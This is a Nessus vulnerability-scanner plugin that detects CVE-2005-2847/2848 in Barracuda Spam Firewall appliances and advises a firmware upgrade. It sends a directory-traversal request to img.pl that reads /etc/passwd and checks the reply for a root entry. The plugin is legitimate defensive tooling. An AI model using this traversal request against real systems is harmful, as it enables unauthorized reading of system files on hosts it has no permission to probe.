#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description) {
  script_id(19556);
  script_version("$Revision: 1.19 $");
  script_cvs_date("$Date: 2016/05/19 17:45:33 $");

  script_cve_id("CVE-2005-2847", "CVE-2005-2848");
  script_bugtraq_id(14710, 14712);
  script_osvdb_id(19279);
  script_xref(name:"EDB-ID", value:"1236");

  script_name(english:"Barracuda Spam Firewall < 3.1.18 Multiple Vulnerabilities");
  script_summary(english:"Attempts to access a local file via directory traversal");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server is affected by multiple vulnerabilities.");
  script_set_attribute(attribute:"description", value:
"The remote host appears to be a Barracuda Spam Firewall network
appliance, which protects mail servers from spam, viruses, and the
like.

Further, it appears that the installed appliance suffers from several
vulnerabilities that allow for execution of arbitrary code and reading
of arbitrary files, all subject to the permissions of the web server
user id.");
 # http://web.archive.org/web/20051026050318/http://www.securiweb.net/wiki/Ressources/AvisDeSecurite/2005.1
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?e58e748c");
  script_set_attribute(attribute:"solution", value:
"Upgrade to firmware 3.1.18 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:U/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"metasploit_name", value:'Barracuda IMG.PL Remote Command Execution');
  script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2005/09/01");
  script_set_attribute(attribute:"patch_publication_date", value:"2005/09/01");
  script_set_attribute(attribute:"plugin_publication_date", value:"2005/09/01");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/h:barracuda_networks:barracuda_spam_firewall");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2005-2016 Tenable Network Security, Inc.");

  script_dependencies("barracuda_detect.nasl");
  script_require_ports("Services/www", 8000);
  script_require_keys("www/barracuda_spamfw");

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");

port = get_http_port(default:8000, embedded:TRUE);
get_kb_item_or_exit("www/barracuda_spamfw");

# Try to exploit one of the flaws to read /etc/passwd.
r = http_send_recv3(
  method : "GET",
  port   : port,
  item   : "/cgi-bin/img.pl?" + "f=../etc/passwd",
  exit_on_fail : TRUE
);
res = r[2];

# There's a problem if there's an entry for root.
if (egrep(string:res, pattern:"root:.*:0:[01]:"))
  security_hole(port);
else audit(AUDIT_LISTEN_NOT_VULN, "Barracuda Spam Firewall" , port);
